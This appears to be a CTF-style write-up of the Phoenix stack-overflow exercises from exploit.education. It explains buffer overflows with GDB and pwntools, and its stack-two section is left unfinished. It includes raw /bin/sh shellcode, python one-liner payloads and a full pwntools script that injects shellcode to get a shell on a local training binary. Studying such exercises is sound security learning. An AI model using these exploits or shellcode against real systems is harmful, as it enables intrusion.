# Exploit education (Phoenix)

This writeup will cover the different exercises from the Phoenix machine on [exploit exercises](exploit-exercises.com).

The first two exercises are not covered. These exercises are very entry level and i recommend figuring these out without help or by viewing liveoverflows buffer overflow playlist (first 8 videos).

## Stack-two

The challenge consist of a C binary. The source code is supplied:

```C

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```

As seen in the code, the `changeme` variable is the target for the bufferoverflow. The buffer is set to 64 bytes, and the strcpy later in the program is set to load all the contents of the environment variable `ExploitEducation`.

Therefore we need to set the value of `ExploitEducation` to our attack. First we inspect the execution of the program with GDB (Gnu debugger).

GDB is very nice tool to help determine if the input is as expected. Some great commands for GDB:

: We can print the stack with the command `x/100x $sp`
: We can inspect a specific register with `x/wx $[register]`. An example is viewing the base pointer with `x/wx $rbp-0x10`.
: disas can be used to disassemble a function.
: Set breakpoints in the execution with `break *<location>`. An example is `break *0x400709`.
: view and set environments with `show environment` and `set environment ENV_KEY=value` respectively.

Ghidra can be used to disassemble and decompile if the source code is not public as it is for these challenges:

: After patching a binary with Ghidra, do `File -> Export Program... -> Format: Original File-> vÃ¦lg output file -> OK`, to create a new patched binary you can run!

**Writeup will be finished later**.

## Stack-three

This exercise aims to overwrite a function pointer insted of a variable. We need to alter the pointer to point to the `complete_level` function. To do this we take advantage of the same style of char array, which we can manipulate freely because of the gets function loading an arbitrary amount of chars into the array (thus causing buffer overflow).

The program looks like this:

```C
#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```

The function pointer `*fp` can be overwritten via the `buffer` char array. To do this we first determine the offset from Buffer -> `*fp`. Load the binary into GDB and create breakpoints at the `gets()` function and the instruction immediately after. This is done by using `disas main` locating the functions in memory and their address, then typing `b *0x<Address>`. After doing this, run the program and continue (Command to continue: `c`) after the first breakpoint to input chars and fill the stack. A good guess for the offset would be 64 chars, to input 64 chars in a repeating, recognisable pattern like: `AAAABBBBCCCC..` and so forth. The inspect find the `rbp` address to find the `*fp` on the stack and inspect the stack to see if the pointer has been overwritten (if you used an offset of 64, for this challenge, the pattern should end just before the pointer address).

Great! You found the offset, now we need to figure out what the address of the `complete_level` function is. This can be done in GDB, but i chose `objdump` for the job, as this can easily be piped to `grep`. The command used to find the address: `objdump -d stack-three | grep "complete_level"`. Append the address to the offset and complete the challenge by using that input!

**Note:** a cool way to input characters and the offset is with python: `python -c "print 'A' * 64 + '\x9d\x06\x40'" | ./stack-three`. Here 64 being the offset length and `'\x9d\x06\x40'` being the address of the `complete_level` function.

## Stack-four

Stack-four aims to teach about what can happen when an attacker can overwrite the saved instruction pointer. This is done by overwriting the return pointer address and making it point to the address of `complete_level()`.

Solution:

```python
python -c "print 'AAAAAAAAAAAAAAAAAAAAABBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR' + '\x1d\x06\x40'" | ./stack-four
```

## Stack-five

This exercise is the first where we are going to inject shellcode and  overwrite the return address to our shellcode for execution. The way to do this is to find a piece of shellcode fitting for our architecture and injecting this on the stack (as the stack is not marked as non-executable in this program).

Problems can arise with the memory layout, making it hard to determine the exact address of the injected shellcode. To solve this, we can use a NOP slide, or No operation slide. What a NOP slide essentially is, is a series of NOP assembler commands *in front* of our shellcode, pointer somerewhere to the middle of this slide to make the program execution follow the slide until it reaches our shellcode. Quite smart!

The C code for this challenge looks a bit different:

```C
#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

We are also seing a larger buffer, probably to make more room for our shellcode. No win function (`complete_level()`) just an invitation to get a shell.

Disassembling `start_level()` gives us:

```assembly
   0x000000000040058d <+0>: push   rbp
   0x000000000040058e <+1>: mov    rbp,rsp
   0x0000000000400591 <+4>: add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>: lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>: mov    rdi,rax
   0x000000000040059c <+15>: call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>: nop
   0x00000000004005a2 <+21>: leave  
   0x00000000004005a3 <+22>: ret  
```

We need to override the ret address to make the instruction pointer (`rip`) return to our shellcode. This we can do by determining the padding/offset. We use the usual strategy of inputting a predictable pattern to the program and viewing the register at the segmentation fault. Input: `AAAAAAAAAAAAAAAAAAAAABBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJMMMMNNNNPPPPRRRR`. This gives a segfault as it overwrites the return address with `PPPPRRRR` Meaning the padding becomes the entire string withour `P` and `R`. The overwrite cause the `rip` register to load the `P` and `R` portion of the string, causing the segmentation fault as this address does not exist.

**NOTE:** In order to determine offset in a less tedious manner, use the either pwntools or metasploit tools to create a pattern. This is detailed later in this writeup or in the `buffer_overflow.md` in this repo.

Shellcode for Linux x86-64, executes `/bin/sh`:
`\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05`.

Shellcode for Linux x86, executes `execve(/bin/sh)`:
`\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80`.

Constructing the payload can be done by appendeing the shellcode to the padding and then the desired return address to the shellcode. Effectively it will look like this: `padding + shellcode + return address`. We ofcourse need to fill the padding with `\0x90` in order to construct our NOP slide.

The stack addresses can change for each execution as can also be seen in GDB when running the program. To counter this, the environment variables can be unset using `unset env`. Yet the NOP slide should be plenty to cope with this problem.

For this particular exercise I had friend introduce me to a less tedious method of solving this kind of problems. We are going to be using pwntools and python to both determine offset and run the binary:

```python
from pwn import *
context.arch = "amd64"
# If local.
# exe = ELF("/home/alexander/bin/cybersecurity/writeups/HTB/academy/buffer_overflow/stack-five")
# r = process([exe.path])
# r.interactive()
padding = b"\x90"
# address = "\xb0\xec\xff\xff"
address = p64(0x4004c3)
# 28 bytes intelx86, not for amd64
# shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
offset = cyclic_find(b"jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva")

shellcode = shellcraft.amd64.linux.sh()
shellcode = asm(shellcode)

# Right justify i.e shift shellcode with padding until it is 128 in length (to the right).
# shellcode = shellcode.ljust(offset, padding)
# left justify as we know that we are jumping to the code, due jmp rax.
shellcode = shellcode.ljust(offset, padding)

payload = (shellcode + address)
# payload = cyclic(200)

s = ssh(host="localhost", user="user", password="user", port=2222)
r = s.process("/opt/phoenix/amd64/stack-five")
r.recvuntil(b"https://exploit.education")
r.sendline(payload)
r.interactive()
```

As I am running the exercise in a Qemu environment i use the `ssh` connector, but the way to execute binaries locally is included in the comments. In the script I am also using pwntools to create a shellcode for my architecture. Pwntools is truly amazing for this job. The script solves the exercise and we get a shell.

**Note**: The commented `payload = cyclic(200)` creates a payload of the specified lenght, which is used to find the offset. Input the string created and view the registers in GDB. Copy the part of the string loaded and parse it to `cyclic_find(b"jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva")` and pwntools will create the correct offset.